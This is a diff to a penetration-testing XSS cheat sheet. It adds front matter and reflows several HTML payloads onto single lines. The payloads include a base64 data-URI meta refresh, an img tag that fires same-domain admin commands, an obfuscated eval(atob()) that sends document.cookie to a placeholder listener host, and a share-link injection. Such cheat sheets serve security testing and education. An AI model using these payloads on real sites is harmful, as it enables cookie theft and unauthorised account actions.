@@ -1,5 +1,8 @@
 ---
-description: XSS CheatSheet - In this CheatSheet, you will find a series of practical example commands for running XSS and getting the most of this.
+title: XSS CheatSheet
+description:XSS CheatSheet - In this CheatSheet, you will find a series of practical example commands for running XSS and getting the most of this.
+template: comments.html
+tags: [penetration-testing, tools, cheatsheet]
 ---
 
 # XSS CheatSheet
@@ -612,10 +615,7 @@ US-ASCII encoding (found by Kurt Huwig).This uses malformed ASCII encoding with 
 The odd thing about meta refresh is that it doesn't send a referrer in the header - so it can be used for certain types of attacks where you need to get rid of referring URLs:
 
 ```html
-<meta
-  http-equiv="refresh"
-  content="0;url=data:text/html base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K"
-/>
+<meta http-equiv="refresh" content="0;url=data:text/html base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K" />
 ```
 
 ## IFRAME
@@ -804,9 +804,7 @@ echo('IPT>alert("XSS")</SCRIPT>'); ?>
 This works when the webpage where this is injected (like a web-board) is behind password protection and that password protection works with other commands on the same domain. This can be used to delete users, add users (if the user who visits the page is an administrator), send credentials elsewhere, etc.... This is one of the lesser used but more useful XSS vectors:
 
 ```html
-<img
-  src="http://www.thesiteyouareon.com/somecommand.php?somevariables=maliciouscode"
-/>
+<img src="http://www.thesiteyouareon.com/somecommand.php?somevariables=maliciouscode" />
 ```
 
 ### IMG Embedded Commands part II
@@ -922,9 +920,7 @@ Again padding is allowed, although you must keep it above 4 total characters per
 ### Base64 Encoding
 
 ```html
-<img
-  onload="eval(atob('ZG9jdW1lbnQubG9jYXRpb249Imh0dHA6Ly9saXN0ZXJuSVAvIitkb2N1bWVudC5jb29raWU='))"
-/>
+<img onload="eval(atob('ZG9jdW1lbnQubG9jYXRpb249Imh0dHA6Ly9saXN0ZXJuSVAvIitkb2N1bWVudC5jb29raWU='))" />
 ```
 
 ### Mixed Encoding
@@ -1026,10 +1022,7 @@ Assume a content sharing flow on a web site is implemented as below. There is a 
 In this case if attacker set untrusted content title as “This is a regular title&content_type=1;alert(1)” the link in "Content" page would be this:
 
 ```html
-<a
-  href="/share?content_type=1&title=This is a regular title&amp;content_type=1;alert(1)"
-  >Share</a
->
+<a href="/share?content_type=1&title=This is a regular title&amp;content_type=1;alert(1)">Share</a>
 ```
 
 ### Share Page Output
